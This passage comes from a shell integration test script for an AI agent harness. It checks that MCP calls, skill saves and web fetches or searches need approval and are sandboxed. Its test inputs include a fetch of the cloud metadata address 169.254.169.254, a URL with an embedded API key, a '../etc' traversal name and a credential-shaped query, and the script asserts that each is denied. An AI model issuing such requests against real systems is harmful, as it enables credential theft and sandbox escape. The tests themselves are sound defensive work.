  ok "mcp: connected, and an unasked call is denied (asked by mcp.ask; nothing ran)"
else bad "mcp unasked: $(grep -o 'mcp\.[a-z]*' "$WORK/m7a.trace" | head -3 | tr '\n' ' ') / $(tail -2 "$WORK/m7a.err")"; fi
[ "$(tag_count "$MCPTAG")" = 0 ] && ok "mcp: the server died with the run" || bad "mcp server survived the run"
python3 -I "$HERE/fake_script.py" $((P7 + 1)) "$WORK/m7a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P7 + 1)) --mcp --approvals:off --i-know-approvals-off --json 'mcp approved' \
  > "$WORK/m7b.trace" 2> "$WORK/m7b.err"
if grep -q 'via mcp' "$WORK/m7b.err" && grep -q '"policy":"approval.user"' "$WORK/m7b.trace"; then
  ok "mcp: an approved call reaches the sandboxed server and returns its text"
else bad "mcp approved: $(tail -2 "$WORK/m7b.err")"; fi
[ "$(tag_count "$MCPTAG")" = 0 ] && ok "mcp: nothing survives the approved run either" || bad "mcp survivor after approved run"
chmod 666 "$MALYUTKA_STATE_DIR/mcp.json"
python3 -I "$HERE/fake_script.py" $((P7 + 2)) "$WORK/m7a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P7 + 2)) --mcp --approvals:off --i-know-approvals-off --json 'mcp unsafe cfg' \
  > "$WORK/m7c.trace" 2> "$WORK/m7c.err"
grep -q '"mcp.failed"' "$WORK/m7c.trace" && ! grep -q 'via mcp' "$WORK/m7c.err" \
  && ok "mcp: a group/world-writable mcp.json is refused wholesale (no servers)" || bad "unsafe mcp.json accepted"
chmod 600 "$MALYUTKA_STATE_DIR/mcp.json"

# skills: save asks; denied by default, saved when approved; list/view return the text as data
python3 -c 'import json; c="---\nname: deploy\ndescription: how to deploy\n---\nrun make then ship\n"; print(json.dumps([[{"name":"skill_save","args":{"name":"deploy","content":c}}]]))' > "$WORK/m7s.json"
python3 -I "$HERE/fake_script.py" $((P7 + 3)) "$WORK/m7s.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P7 + 3)) --skills --json 'save a skill (default: deny)' > "$WORK/m7d.trace" 2> "$WORK/m7d.err"
[ ! -e "$MALYUTKA_STATE_DIR/skills/deploy/SKILL.md" ] && grep -q 'asked by approval.dangerous' "$WORK/m7d.err" \
  && ok "skills: skill_save is denied without an approver" || bad "skill_save without approver: $(tail -2 "$WORK/m7d.err")"
python3 -I "$HERE/fake_script.py" $((P7 + 4)) "$WORK/m7s.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P7 + 4)) --skills --approvals:off --i-know-approvals-off --json 'save a skill (approved)' > "$WORK/m7e.trace" 2>/dev/null
sk="$MALYUTKA_STATE_DIR/skills/deploy/SKILL.md"
[ -f "$sk" ] && [ "$(stat -c %a "$sk")" = 600 ] && [ "$(stat -c %a "$MALYUTKA_STATE_DIR/skills/deploy")" = 700 ] \
  && ok "skills: approved skill_save wrote SKILL.md (0600) in a 0700 dir under the state dir" || bad "skill not saved with right modes"
echo '[[{"name":"skills_list","args":{}},{"name":"skill_view","args":{"name":"deploy"}},{"name":"skill_view","args":{"name":"../etc"}}]]' > "$WORK/m7v.json"
python3 -I "$HERE/fake_script.py" $((P7 + 5)) "$WORK/m7v.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P7 + 5)) --skills --json 'list and view' > "$WORK/m7f.trace" 2> "$WORK/m7f.err"
if grep -q 'deploy: how to deploy' "$WORK/m7f.err" && grep -q 'run make then ship' "$WORK/m7f.err" && grep -q 'invalid skill name' "$WORK/m7f.err"; then
  ok "skills: list and view return the text; a traversal name is refused"
else bad "skills list/view: $(tail -3 "$WORK/m7f.err")"; fi
[ ! -e "$WORK/m7/state/etc" ] && ok "skills: nothing written outside <state>/skills" || bad "skill path escape"
unset MALYUTKA_STATE_DIR
export MALYUTKA_STATE_DIR="$WORK/state"

# 16. Web access through the real CLI (sandboxed helper, local fake web server).
if [ -x "$(dirname "$BIN")/malyutka_web" ]; then
mkdir -p "$WORK/m8/ws" && cd "$WORK/m8/ws" || exit 2
P8=$((P7 + 40)); WEBP=$((P8 + 20))
export MALYUTKA_STATE_DIR="$WORK/m8/state"; mkdir -p "$MALYUTKA_STATE_DIR"
python3 -I "$HERE/fake_web.py" "$WEBP" "$WORK/m8/web.log" >/dev/null 2>&1 &
echo $! > "$WORK/m8/web.pid"; sleep 0.8
WURL="http://127.0.0.1:$WEBP/html"
echo "{\"fetch\": {\"allowPrivateHosts\": [\"127.0.0.1\"]}}" > "$MALYUTKA_STATE_DIR/web.json"; chmod 600 "$MALYUTKA_STATE_DIR/web.json"
python3 -c 'import json,sys; print(json.dumps([[{"name":"web_fetch","args":{"url":sys.argv[1]}}]]))' "$WURL" > "$WORK/m8a.json"
python3 -I "$HERE/fake_script.py" "$P8" "$WORK/m8a.json" >/dev/null 2>&1 & sleep 0.5
: > "$WORK/m8/web.log"
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P8 --web --json 'web unasked' > "$WORK/m8a.trace" 2> "$WORK/m8a.err"
if grep -q 'asked by web.ask' "$WORK/m8a.err" && [ ! -s "$WORK/m8/web.log" ]; then
  ok "web: an unasked fetch is denied (asked by web.ask) and never reached the server"
else bad "web unasked: $(tail -2 "$WORK/m8a.err") log=$(cat "$WORK/m8/web.log")"; fi
python3 -I "$HERE/fake_script.py" $((P8 + 1)) "$WORK/m8a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 1)) --web --approvals:off --i-know-approvals-off --json 'web approved' \
  > "$WORK/m8b.trace" 2> "$WORK/m8b.err"
if grep -q '\[web_fetch http://127.0.0.1:'"$WEBP"'/html' "$WORK/m8b.err" && grep -q '# Heading' "$WORK/m8b.err" \
   && grep -q 'untrusted page text' "$WORK/m8b.err" && grep -q '"web.fetched"' "$WORK/m8b.trace" && [ "$(grep -c 'GET /html' "$WORK/m8/web.log")" = 1 ]; then
  ok "web: an approved fetch returns labelled untrusted text through the sandboxed helper (one request)"
else bad "web approved: $(tail -2 "$WORK/m8b.err")"; fi
"$BIN" journal >/dev/null 2>&1 && ok "web: the journal records the B3 call and stays healthy" || bad "journal after web fetch"

# DENY stays DENY even with approvals off: no web.json opt-in, metadata, credentials
rm -f "$MALYUTKA_STATE_DIR/web.json"
python3 -c 'import json,sys; u=sys.argv[1]; print(json.dumps([[{"name":"web_fetch","args":{"url":u}}],[{"name":"web_fetch","args":{"url":"http://169.254.169.254/latest/meta-data/"}}],[{"name":"web_fetch","args":{"url":"https://example.com/?api_key=abcdef"}}]]))' "$WURL" > "$WORK/m8c.json"
python3 -I "$HERE/fake_script.py" $((P8 + 2)) "$WORK/m8c.json" >/dev/null 2>&1 & sleep 0.5
: > "$WORK/m8/web.log"
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 2)) --web --approvals:off --i-know-approvals-off --json 'web denials' \
  > "$WORK/m8c.trace" 2> "$WORK/m8c.err"
n=$(grep -c '"verdict":"DENY"' "$WORK/m8c.trace")
if [ "$n" = 3 ] && [ ! -s "$WORK/m8/web.log" ] && grep -q 'not public' "$WORK/m8c.err" && grep -q 'metadata' "$WORK/m8c.err" && grep -q 'credential' "$WORK/m8c.err"; then
  ok "web: private target, metadata address and a credential in the URL are DENIED even with approvals off"
else bad "web denials: deny count=$n log=$(cat "$WORK/m8/web.log")"; fi

# strict config: a world-writable web.json switches web access off
echo '{"fetch": {"denyDomains": ["x.com"]}}' > "$MALYUTKA_STATE_DIR/web.json"; chmod 666 "$MALYUTKA_STATE_DIR/web.json"
python3 -I "$HERE/fake_script.py" $((P8 + 3)) "$WORK/m8a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 3)) --web --approvals:off --i-know-approvals-off --json 'web unsafe cfg' \
  > "$WORK/m8d.trace" 2> "$WORK/m8d.err"
grep -q 'web access disabled' "$WORK/m8d.err" && grep -q 'DENIED by registry' "$WORK/m8d.err" \
  && ok "web: an unsafe web.json disables web access (the tool does not exist)" || bad "unsafe web.json: $(tail -2 "$WORK/m8d.err")"
rm -f "$MALYUTKA_STATE_DIR/web.json"

# a missing helper: tool absent, reason visible, run unaffected
python3 -I "$HERE/fake_script.py" $((P8 + 4)) "$WORK/m8a.json" >/dev/null 2>&1 & sleep 0.5
MALYUTKA_WEB_HELPER=/nonexistent/malyutka_web "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 4)) --web --json 'no helper' \
  > "$WORK/m8e.trace" 2> "$WORK/m8e.err"; rc=$?
grep -q '"web.unavailable"' "$WORK/m8e.trace" && grep -q 'helper not found' "$WORK/m8e.trace" && [ $rc -eq 0 ] \
  && ok "web: a missing helper means no tool, a visible reason, and an unaffected run" || bad "missing helper (exit $rc)"

# the harness itself does not need libssl: mask it and run a normal task
L=/usr/lib/x86_64-linux-gnu
if [ -e "$L/libssl.so.3" ] && command -v bwrap >/dev/null; then
  MALYUTKA_STATE_DIR="$WORK/m8/state2" bwrap --ro-bind / / --ro-bind /dev/null "$L/libssl.so.3" --ro-bind /dev/null "$L/libcrypto.so.3" \
    --dev /dev --proc /proc --bind "$WORK" "$WORK" "$BIN" run --provider:mock --theme:plain 'no libssl here' > /dev/null 2>&1; rc=$?
  [ $rc -eq 0 ] && ok "web: malyutka itself starts and runs with libssl unavailable (only the helper needs it)" || bad "harness needs libssl (exit $rc)"
fi
"$BIN" doctor 2>/dev/null | grep -q '^web: ' && ok "doctor reports the web helper" || bad "doctor has no web line"

# web_search: only a trust:allow SearXNG on loopback runs unasked; everything else asks; credential-shaped queries are DENIED
SX="http://127.0.0.1:$WEBP/searx"
python3 -c 'import json; print(json.dumps([[{"name":"web_search","args":{"query":"nim language"}}]]))' > "$WORK/m8s.json"
python3 -c 'import json; print(json.dumps([[{"name":"web_search","args":{"query":"sk-"+"a"*40}}]]))' > "$WORK/m8k.json"
echo "{\"search\": {\"backend\": \"searxng\", \"searxng\": {\"url\": \"$SX\", \"trust\": \"allow\"}}}" > "$MALYUTKA_STATE_DIR/web.json"; chmod 600 "$MALYUTKA_STATE_DIR/web.json"
python3 -I "$HERE/fake_script.py" $((P8 + 5)) "$WORK/m8s.json" >/dev/null 2>&1 & sleep 0.5
: > "$WORK/m8/web.log"
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 5)) --web --json 'search trusted' > "$WORK/m8f.trace" 2> "$WORK/m8f.err"
if grep -Eq 'web_search searxng .{1,8} 5 results .{1,8} untrusted search results' "$WORK/m8f.err" && grep -q '"web.searched"' "$WORK/m8f.trace" \
   && grep -q 'GET /searx/search?q=nim%20language&format=json' "$WORK/m8/web.log"; then
  ok "web_search: a trust:allow SearXNG on loopback runs unasked and returns labelled results"
else bad "trusted search: $(tail -3 "$WORK/m8f.err")"; fi

echo "{\"search\": {\"backend\": \"searxng\", \"searxng\": {\"url\": \"$SX\"}}}" > "$MALYUTKA_STATE_DIR/web.json"
python3 -I "$HERE/fake_script.py" $((P8 + 6)) "$WORK/m8s.json" >/dev/null 2>&1 & sleep 0.5
: > "$WORK/m8/web.log"
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 6)) --web --json 'search untrusted' > "$WORK/m8g.trace" 2> "$WORK/m8g.err"
grep -q 'asked by web.ask' "$WORK/m8g.err" && [ ! -s "$WORK/m8/web.log" ] \
  && ok "web_search: without trust:allow the search asks (denied with no approver) and never reaches the server" || bad "untrusted search: $(tail -2 "$WORK/m8g.err")"

echo "{\"search\": {\"backend\": \"searxng\", \"searxng\": {\"url\": \"http://192.168.1.5:8888\", \"trust\": \"allow\"}}}" > "$MALYUTKA_STATE_DIR/web.json"
python3 -I "$HERE/fake_script.py" $((P8 + 7)) "$WORK/m8s.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 7)) --web --json 'search nonloopback trust' > "$WORK/m8h.trace" 2> "$WORK/m8h.err"
grep -q 'web access disabled' "$WORK/m8h.err" && grep -q 'loopback' "$WORK/m8h.err" \
  && ok "web_search: trust:allow for a non-loopback host is a config defect that turns web access off" || bad "non-loopback trust: $(tail -2 "$WORK/m8h.err")"

echo "{\"search\": {\"backend\": \"searxng\", \"searxng\": {\"url\": \"$SX\", \"trust\": \"allow\"}}}" > "$MALYUTKA_STATE_DIR/web.json"
python3 -I "$HERE/fake_script.py" $((P8 + 8)) "$WORK/m8k.json" >/dev/null 2>&1 & sleep 0.5
: > "$WORK/m8/web.log"
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P8 + 8)) --web --approvals:off --i-know-approvals-off --json 'search secret' > "$WORK/m8i.trace" 2> "$WORK/m8i.err"
grep -q '"verdict":"DENY"' "$WORK/m8i.trace" && grep -q 'credential' "$WORK/m8i.err" && [ ! -s "$WORK/m8/web.log" ] \
  && ok "web_search: a credential-shaped query is DENIED even on a trusted backend with approvals off" || bad "secret query: $(tail -2 "$WORK/m8i.err")"
rm -f "$MALYUTKA_STATE_DIR/web.json"
kill "$(cat "$WORK/m8/web.pid")" 2>/dev/null
unset MALYUTKA_STATE_DIR
export MALYUTKA_STATE_DIR="$WORK/state"
else
  echo "  [SKIP] web: malyutka_web is not built next to $BIN"
fi


# bare `malyutka` / `malyutka tui` hand over to the TUI (stub binary), and piped bare `malyutka` still prints the help
cat > "$WORK/stub-tui.sh" <<'STUB'
#!/bin/sh
echo "TUI-STUB bin=$MALYUTKA_BIN args=$*"
STUB
chmod +x "$WORK/stub-tui.sh"
out=$(MALYUTKA_TUI="$WORK/stub-tui.sh" "$BIN" tui --skin ares 2>&1)
case "$out" in *"TUI-STUB bin="*"malyutka"*" args=--skin ares"*) ok "tui: 'malyutka tui' execs the TUI with MALYUTKA_BIN set and the options passed through";; *) bad "malyutka tui: $out";; esac
"$BIN" 2>&1 < /dev/null | grep -q '^Usage:' && ok "tui: bare malyutka without a terminal prints the help (scripts are unaffected)" || bad "bare malyutka off-tty"
out=$(MALYUTKA_TUI=/nonexistent/tui "$BIN" tui 2>&1)
case "$out" in *"not built"*"Usage:"*) ok "tui: a missing TUI falls back to the help with a build hint";; *) bad "missing tui: $out";; esac

echo "integration: $pass passed, $fail failed"
[ $fail -eq 0 ]
